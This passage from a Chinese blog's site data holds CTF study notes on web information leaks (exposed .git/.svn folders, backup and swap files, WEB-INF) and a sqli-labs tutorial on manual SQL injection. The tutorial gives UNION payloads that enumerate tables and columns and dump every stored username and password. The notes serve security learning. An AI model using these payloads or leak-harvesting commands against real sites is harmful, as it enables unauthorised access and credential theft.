rel=\"noopener\">Linux</a>，现在Mercurial已经移植到<a href=\"https://zh.wikipedia.org/wiki/Windows\" target=\"_blank\" rel=\"noopener\">Windows</a>、<a href=\"https://zh.wikipedia.org/wiki/Mac_OS_X\" target=\"_blank\" rel=\"noopener\">Mac OS X</a>和大多数的<a href=\"https://zh.wikipedia.org/wiki/类Unix\" target=\"_blank\" rel=\"noopener\">类Unix</a>系统中。Mercurial主要由<a href=\"https://zh.wikipedia.org/wiki/命令行界面\" target=\"_blank\" rel=\"noopener\">命令行</a>程序组成，现在也有了<a href=\"https://zh.wikipedia.org/wiki/图形用户界面\" target=\"_blank\" rel=\"noopener\">图形用户界面</a>。对Mercurial的所有操作都由用不同的关键字作为参数调用程序“hg”来实现，Hg是参考<a href=\"https://zh.wikipedia.org/wiki/水银\" target=\"_blank\" rel=\"noopener\">水银</a>的<a href=\"https://zh.wikipedia.org/wiki/化学符号\" target=\"_blank\" rel=\"noopener\">化学符号</a>而取的名字。</p>\n</blockquote>\n<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>\n<p>仍然使用dvcs-ripper工具将.hg文件夹克隆到本地。然后可以使用命令查找 ，也可以使用手工查找。</p>\n<p>遇到这种版本控制系统的信息泄露情况，如果会使用这些版本空控制系统，显然会有很多的好处。如果不熟悉它们的话，也不用太过担心，很多时候手工也能找到有用信息。不过有机会还是学习使用一下这些版本控制系统，或者了解一些原理和命令好了，毕竟没有坏处。</p>\n<h2 id=\"CVS泄露\"><a href=\"#CVS泄露\" class=\"headerlink\" title=\"CVS泄露\"></a>CVS泄露</h2><p>还是使用dvcs-ripper工具克隆然后分析。</p>\n<p>以后有机会详细学习记录一下这几个常见的版本控制系统吧。</p>\n<h2 id=\"WEB-INF-web-xml泄露\"><a href=\"#WEB-INF-web-xml泄露\" class=\"headerlink\" title=\"WEB-INF/web.xml泄露\"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>\n<pre><code> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n\n​     \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n\n​     \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n\n​     \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n​  \n\n  /WEB-INF/database.properties：数据库配置文件\n</code></pre><p>漏洞成因：</p>\n<p>​    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>\n<p><strong>漏洞检测以及利用方法</strong>：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>\n<p>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"信息泄露总结\"><a href=\"#信息泄露总结\" class=\"headerlink\" title=\"信息泄露总结\"></a>信息泄露总结</h1><h2 id=\"目录遍历\"><a href=\"#目录遍历\" class=\"headerlink\" title=\"目录遍历\"></a>目录遍历</h2><p>顾名思义，就是翻找目录。查找目录中的有用信息。一般来说要结合dirsearch或御剑等工具来进行查找。</p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><p>在可以“有限”地执行php命令地地方执行phpinfo()函数，可以得到服务器php配置的信息，比如：环境变量，可用模块，网站绝对路径，服务器操作系统，使用的组件等，为之后的操作提供思路和帮助。</p>\n<h2 id=\"备份文件下载\"><a href=\"#备份文件下载\" class=\"headerlink\" title=\"备份文件下载\"></a>备份文件下载</h2><h3 id=\"网站源码泄露\"><a href=\"#网站源码泄露\" class=\"headerlink\" title=\"网站源码泄露\"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且不小心将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>\n<p>常见的的文件名：</p>\n<p>www</p>\n<p>wwwroot</p>\n<p>back</p>\n<p>backup</p>\n<p>web</p>\n<p>website</p>\n<p>temp</p>\n<p>常见的后缀：</p>\n<p>zip</p>\n<p>rar</p>\n<p>tar</p>\n<p>tar.gz</p>\n<h3 id=\"bak文件\"><a href=\"#bak文件\" class=\"headerlink\" title=\"bak文件\"></a>bak文件</h3><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个或某部分文件的源代码。</p>\n<p>即：文件名后面加后缀 .bak</p>\n<h3 id=\"vim缓存\"><a href=\"#vim缓存\" class=\"headerlink\" title=\"vim缓存\"></a>vim缓存</h3><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>\n<p>非正常关闭vim编辑器时会生成一个.swp文件</p>\n<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p>\n<p>以 index.php 为例：</p>\n<p>第一次产生的交换文件名为 .index.php.swp</p>\n<p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p>\n<p>第三次产生的交换文件则为 .index.php.swn。</p>\n<p>可以放到linux系统中使用vim工具加参数 -r修复此备份文件并打开</p>\n<h3 id=\"DS-Store文件\"><a href=\"#DS-Store文件\" class=\"headerlink\" title=\".DS_Store文件\"></a>.DS_Store文件</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。</p>\n<p><strong>通过.DS_Store可以知道这个目录里面所有文件的清单。</strong></p>\n<p>.DS_Store可以直接使用记事本打开，但是打开后乱码居多；也可以使用 Python-dsstore 这个工具 (<a href=\"https://github.com/gehaxelt/Python-dsstore\" target=\"_blank\" rel=\"noopener\">https://github.com/gehaxelt/Python-dsstore</a>)  来完成 .DS_Store 文件的解析，直观一些。</p>\n<h2 id=\"版本控制系统有关的泄露（Git、SVN、HG）\"><a href=\"#版本控制系统有关的泄露（Git、SVN、HG）\" class=\"headerlink\" title=\"版本控制系统有关的泄露（Git、SVN、HG）\"></a>版本控制系统有关的泄露（Git、SVN、HG）</h2><h3 id=\"版本控制系统\"><a href=\"#版本控制系统\" class=\"headerlink\" title=\"版本控制系统\"></a>版本控制系统</h3><p>集中式版本控制系统：Subversion(SVN)、CVS、VSS 等。<br>分布式版本控制系统：Git、Mercurial(Hg) 等。</p>\n<p>对于各个版本控制系统的区别的分析介绍:<a href=\"https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html</a></p>\n<h2 id=\"Git泄露\"><a href=\"#Git泄露\" class=\"headerlink\" title=\"Git泄露\"></a>Git泄露</h2><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>\n<p>1.漏洞利用：工具：GitHack （<a href=\"https://github.com/BugScanTeam/GitHack）\" target=\"_blank\" rel=\"noopener\">https://github.com/BugScanTeam/GitHack）</a> 或 dvcs-ripper （<a href=\"https://github.com/kost/dvcs-ripper）\" target=\"_blank\" rel=\"noopener\">https://github.com/kost/dvcs-ripper）</a></p>\n<p><strong>GitHack</strong></p>\n<p>使用方法：</p>\n<pre><code>python2 GitHack.py URL/.git/</code></pre><p><strong>dvcs-ripper</strong></p>\n<p>使用方法:</p>\n<p>Example run (for git):</p>\n<pre><code class=\"bash\">rip-git.pl -v -u URL/.git/\n\nIt will automatically do git checkout -f</code></pre>\n<p>or if you would like to ignore SSL certification verification (with -s):</p>\n<pre><code class=\"bash\">rip-git.pl -s -v -u http://www.example.com/.git/</code></pre>\n<p><img src=\"/img/20200825145004389.jpg\" alt=\"Git常用命令\"></p>\n<h3 id=\"log\"><a href=\"#log\" class=\"headerlink\" title=\"log\"></a>log</h3><p>log即指git中的日志，通过 <code>git log</code>命令来查看该项目的日志，然后用<code>git diff</code>命令来查看现版本和之前版本有什么不同，或者用<code>git reset</code>命令直接回到该版本。</p>\n<h3 id=\"stash\"><a href=\"#stash\" class=\"headerlink\" title=\"stash\"></a>stash</h3><p>stash就相当于一个临时储存列表，当程序员想要调试该版本又不想丢掉之前某个版本的时候，就可以使用<code>git stash</code>命令将本地修改保存起来，并回到之前的版本。</p>\n<pre><code class=\"bash\">通过git stash存储的修改列表,可以通过git stash list查看.\n\ngit stash show用于校验.\n\ngit stash apply用于重新存储.\n\n直接执行git stash等同于git stash save.</code></pre>\n<p>最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p>\n<p>步骤：</p>\n<p>1.用<code>git stash list</code>命令查看储存列表</p>\n<p>2.用<code>git stash show</code>查看该版本有什么不同</p>\n<p>3.用<code>git stash pop stash@{n}</code>来释放这个版本，n为要释放的版本的索引。</p>\n<h3 id=\"index\"><a href=\"#index\" class=\"headerlink\" title=\"index\"></a>index</h3><p>index是Git本地库中的索引，是一个二进制文件。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。</p>\n<p>索引中还包含所有Blob类型的SHA-1标识符。</p>\n<blockquote>\n<p><strong>Git文件状态</strong></p>\n<p>对于新创建的一个文件，其状态为untracked。</p>\n<p>通过git add …命令，可以将该新建文件的状态转换为staged，这个过程就是将新建文件加入到Index中。</p>\n<p>通过git commit命令，可以将处于staged状态的文件提交到本地库的HEAD。</p>\n</blockquote>\n<p><strong>关键</strong></p>\n<p><code>git checkout-index</code>命令</p>\n<p><strong>将Index中列表的文件检出到工作目录，默认不覆盖已有文件</strong>。</p>\n<ul>\n<li>-u, –index，更新所有检出的文件的stat信息（git status）</li>\n<li>-a, –all，检出Index中列表的所有文件</li>\n<li>-f, –force，检出时覆盖已有文件</li>\n<li>-n, –no-create，只再次检出工作目录中已有的文件（不创建任何新文件）</li>\n<li>–，禁用任何参数</li>\n</ul>\n<p>例如：</p>\n<ul>\n<li>从Index检出已有文件的最新版本，并覆盖</li>\n</ul>\n<pre><code>git checkout-index -n -f</code></pre><ul>\n<li>检出全部文件到git-export-dir目录</li>\n</ul>\n<pre><code>git checkout-index -a --prefix=git-export-dir/</code></pre><ul>\n<li>检出文件Makefile，并重命名为.merged-Makefile</li>\n</ul>\n<pre><code>git checkout-index --prefix=.merged- Makefile</code></pre><p><strong>可能有用</strong></p>\n<ol>\n<li><code>git update-index</code>命令<br> 将工作目录中的文件加入到index列表中。<br> 不建议使用该命令，同样情况下推荐使用git add</li>\n</ol>\n<p>如下命令完全等价：</p>\n<ul>\n<li>为myFile文件设置可执行权限</li>\n</ul>\n<pre><code>git add --chmod=+x myFile\ngit update-index --chmod=+x myFile</code></pre><ul>\n<li>为myFile文件撤销可执行权限</li>\n</ul>\n<pre><code>git add --chmod=-x myFilegit update-index --chmod=-x myFile</code></pre><ol start=\"2\">\n<li><code>git merge-index</code>命令<br>为Index中需要合并的文件执行合并操作。<br>基本用法：</li>\n</ol>\n<pre><code>git merge-index [-o] [-q] &lt;merge-program&gt; (-a | [--] &lt;file&gt;*)</code></pre><p>示例：</p>\n<pre><code>git merge-index cat a_script_file</code></pre><p>Git的内容挺多的，以上只涉及到了跟CTF有关的内容，以后有机会还得深入了解学习一下。</p>\n<h2 id=\"SVN泄露\"><a href=\"#SVN泄露\" class=\"headerlink\" title=\"SVN泄露\"></a>SVN泄露</h2><blockquote>\n<p>当开发人员使用 SVN （Subversion）进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>\n</blockquote>\n<p>使用工具dvcs-ripper  链接：<a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">https://github.com/kost/dvcs-ripper</a></p>\n<p>在windows上使用没成功，环境不对，安装了active Perl也不行，还缺少个SQLite和什么东西，于是直接在kali上使用好了</p>\n<ul>\n<li>安装：<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code></li>\n<li>gitclone: <code>git clone https://github.com/kost/dvcs-ripper</code></li>\n<li>进入目录</li>\n<li>命令： <code>./rip-svn.pl -v -u http://www.example.com/.svn/</code></li>\n</ul>\n<p>然后会克隆下来一个.svn文件夹，默认是隐藏文件夹，按Ctrl+H显示，之后自行寻找.svn文件夹中关于flag的线索即可</p>\n<p>如果系统中有Subversion的话，</p>\n<p>通过svn命令可以根据时间或修订号去除过去的版本，或者某一版本所做的具体的修改。以下四个命令可以用来查看svn 的历史：</p>\n<ul>\n<li><strong>svn log:</strong> 用来展示svn 的版本作者、日期、路径等等。</li>\n<li><strong>svn diff:</strong> 用来显示特定修改的行级详细信息。</li>\n<li><strong>svn cat:</strong> 取得在特定版本的某文件显示在当前屏幕。</li>\n<li><strong>svn list:</strong> 显示一个目录或某一版本存在的文件。</li>\n</ul>\n<h2 id=\"HG泄露\"><a href=\"#HG泄露\" class=\"headerlink\" title=\"HG泄露\"></a>HG泄露</h2><blockquote>\n<p><strong>Mercurial</strong>是<a href=\"https://zh.wikipedia.org/wiki/跨平台\" target=\"_blank\" rel=\"noopener\">跨平台</a>的<a href=\"https://zh.wikipedia.org/wiki/分布式版本控制\" target=\"_blank\" rel=\"noopener\">分布式版本控制</a>软件，主要由<a href=\"https://zh.wikipedia.org/wiki/Python\" target=\"_blank\" rel=\"noopener\">Python</a>语言实现，但也包含用<a href=\"https://zh.wikipedia.org/wiki/C语言\" target=\"_blank\" rel=\"noopener\">C语言</a>实现的二进制比较工具。Mercurial一开始的主要运行平台是<a href=\"https://zh.wikipedia.org/wiki/Linux\" target=\"_blank\" rel=\"noopener\">Linux</a>，现在Mercurial已经移植到<a href=\"https://zh.wikipedia.org/wiki/Windows\" target=\"_blank\" rel=\"noopener\">Windows</a>、<a href=\"https://zh.wikipedia.org/wiki/Mac_OS_X\" target=\"_blank\" rel=\"noopener\">Mac OS X</a>和大多数的<a href=\"https://zh.wikipedia.org/wiki/类Unix\" target=\"_blank\" rel=\"noopener\">类Unix</a>系统中。Mercurial主要由<a href=\"https://zh.wikipedia.org/wiki/命令行界面\" target=\"_blank\" rel=\"noopener\">命令行</a>程序组成，现在也有了<a href=\"https://zh.wikipedia.org/wiki/图形用户界面\" target=\"_blank\" rel=\"noopener\">图形用户界面</a>。对Mercurial的所有操作都由用不同的关键字作为参数调用程序“hg”来实现，Hg是参考<a href=\"https://zh.wikipedia.org/wiki/水银\" target=\"_blank\" rel=\"noopener\">水银</a>的<a href=\"https://zh.wikipedia.org/wiki/化学符号\" target=\"_blank\" rel=\"noopener\">化学符号</a>而取的名字。</p>\n</blockquote>\n<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>\n<p>仍然使用dvcs-ripper工具将.hg文件夹克隆到本地。然后可以使用命令查找 ，也可以使用手工查找。</p>\n<p>遇到这种版本控制系统的信息泄露情况，如果会使用这些版本空控制系统，显然会有很多的好处。如果不熟悉它们的话，也不用太过担心，很多时候手工也能找到有用信息。不过有机会还是学习使用一下这些版本控制系统，或者了解一些原理和命令好了，毕竟没有坏处。</p>\n<h2 id=\"CVS泄露\"><a href=\"#CVS泄露\" class=\"headerlink\" title=\"CVS泄露\"></a>CVS泄露</h2><p>还是使用dvcs-ripper工具克隆然后分析。</p>\n<p>以后有机会详细学习记录一下这几个常见的版本控制系统吧。</p>\n<h2 id=\"WEB-INF-web-xml泄露\"><a href=\"#WEB-INF-web-xml泄露\" class=\"headerlink\" title=\"WEB-INF/web.xml泄露\"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>\n<pre><code> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n\n​     \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n\n​     \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n\n​     \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n​  \n\n  /WEB-INF/database.properties：数据库配置文件\n</code></pre><p>漏洞成因：</p>\n<p>​    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>\n<p><strong>漏洞检测以及利用方法</strong>：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>\n<p>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>\n"},{"layout":"post","title":"ctf手工SQL注入","date":"2021-01-15T16:00:00.000Z","description":"详解ctf中的SQL手工注入","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# SQL注入 \n\nSQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管理员账号密码，重要数据等），修改数据库信息。\n\n\n\n> 按照注入点类型来分类\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。\n\n这一类的 SQL 语句原型大概为 `select * from 表名 where id=1 ` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。\n\n若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。\n\n此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n> 按照数据提交的方式来分类\n\n### （1）GET 注入\n\n提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/index.php?id=1 , id 是注入点。\n\n### （2）POST 注入\n\n使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。\n\n### （3）Cookie 注入\n\nHTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。\n\n### （4）HTTP 头部注入\n\n注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n\n> 按照执行效果来分类\n\n### （1）基于布尔的盲注\n\n即可以根据返回页面判断条件真假的注入。\n\n### （2）基于时间的盲注\n\n即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n### （3）基于报错注入\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n1. 单引号\n2. 双引号\n3. 基于数字型注入\n\n### （4）联合查询注入\n\n可以使用union的情况下的注入。\n\n### （5）堆查询注入\n\n可以同时执行多条语句的执行时的注入。\n\n### （6）宽字节注入\n\n宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）\n\n### 基于sqli-labs的实践操作\n\n#### 1.基于报错的GET sql注入\n\n##### less-1\n\n![](/img/less-1.png)\n\n提示说输入一个数字作为ID的值\n\n那么先在url输入?id=1\n\n![](/img/less-1输入id=1.png)\n\n显示查询成功，返回了用户Dumb\n\n然后尝试使其报错，输入 ?id=1'\n\n![](/img/less-1输入id-1'.png)\n\n报错了，显示为 ''1'' LIMIT 0,1'\n\n有了这个，我们就可以揣测一下网站后端的sql请求语句了\n\n首先，这个报错语句是被 ' ' 单引号闭合的，于是将其拆分 '   '1'' LIMIT 0,1   '，可知报错的段落是 '1'' LIMIT 0,1,由于我们输入的id值是1'\n\n,所以再拆分一下为'   1'   ' LIMIT 0,1\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"\n```\n\n id被单引号包裹，这是字符型注入点\n\n##### less-2\n\n![](/img/less-2.png)\n\n流程与上面差不多\n\n不同的是，这次输入id=1'后报错为 '' LIMIT 0,1'\n\n还是用和上面一样的方法拆分这段 ，'     ' LIMIT 0,1      '  -->' LIMIT 0,1\n\n可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id =$id limit 0,1 \"\n```\n\nid没有被单引号包裹，这是一个数字型注入点\n\n##### less-3\n\n![](/img/less-3.png)\n\n这次的报错是 ''1'') LIMIT 0,1'\n\n拆分 '   '1'') LIMIT 0,1   '-->'1'') LIMIT 0,1-->'   *1'*   ') LIMIT 0,1\n\n显然，后台语句是\n\n```mysql\n\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"\n```\n\n但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了\n\n比如上面这个less-3\n\n我们试着把输入改为 id=1') --+或id=1') --%20\n\n![](/img/--+.png)\n\n\n\n![](/img/-- .png)\n\n都成功了，这就说明后台语句和我们想的八九不离十了\n\n##### less-4\n\n这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被\"\"包裹了，输入的id值都会被当作字符串，加单引号括号都没用。\n\n那就使用\\来制造报错，输入 id=1\\\n\n返回报错 '\"1\\\\\") LIMIT 0,1'-->\"1\\\\\") LIMIT 0,1\n\n\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错\n\n合理推测：\n\n```mysql\n\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"\n```\n\n验证：\n\n![](/img/less-4.png)\n\n这样4种不同的注入点的后台语句就通过报错大致的试出来了\n\n之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等\n\n例如less-1(字符型) 就可以输入?id=1' order by 1[,2,3,4... ] --+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用\n\nless-1能够order by到3，也就是它有3个字段，于是接下来union注入\n\n我们要构造的语句是SELECT [username,password] FROM user WHERE id = '0' union select 1,2,3 --+ limit 0,1\n\n所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0' union select 1,2,3 --+\n\n这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果\n\n效果\n\n![](/img/union注入.png)\n\n可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用\n\n于是接下来注入 id=0' union select 1,user(),database() --+\n\n![](/img/union爆库.png)\n\n爆出了用户名和使用的数据库名\n\n然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入\n\n例如：\n\n爆表：\n\n```mysql\nid=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+\n```\n\n​\t\t\tinformation_schema是储存了所有数据库信息的库，tables储存了所有表信息的表\n\n![](/img/union爆表.png)\n\n看到了最后一个表是'users',可用于下一步爆字段\n\n爆字段：\n\n```mysql\nid=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+\t\t//记得最后这个表名要加单引号，不然没用\n```\n\n![](/img/union爆字段.png)\n\n爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了\n\n```mysql\nid=0' union select 1,group_concat(username,0x3a,password),3 from [security.]users --+\t\t//有时候要在表名前面加上数据库名，不然也出不来,即 这个环境下的security.\n```\n\n![](/img/union爆出账号密码.png)\n\n好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了\n\n## 利用SQLmap工具进行sql注入\n\n进入SQLmap工具目录打开命令行，输入命令\n\n```bash\npy 